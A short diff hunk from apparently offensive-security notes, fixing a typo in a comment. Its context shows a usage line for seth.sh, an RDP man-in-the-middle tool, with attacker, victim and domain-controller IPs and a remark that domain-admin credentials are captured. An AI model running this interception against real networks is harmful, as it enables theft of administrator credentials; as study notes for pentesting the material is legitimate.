@@ -48,5 +48,5 @@ LLMNR Poisoning mitigation :
 ```bash
 ./seth.sh <interface> <attacker ip> <victum ip> <DC ip>
 ./seth.sh eth0 192.168.154.137 192.168.154.131 192.168.154.134
-#when vitum domain admin group user try to connect to dc ip , account credentials we capture .
+#when victum domain admin group user try to connect to dc ip , account credentials we capture .
 ```
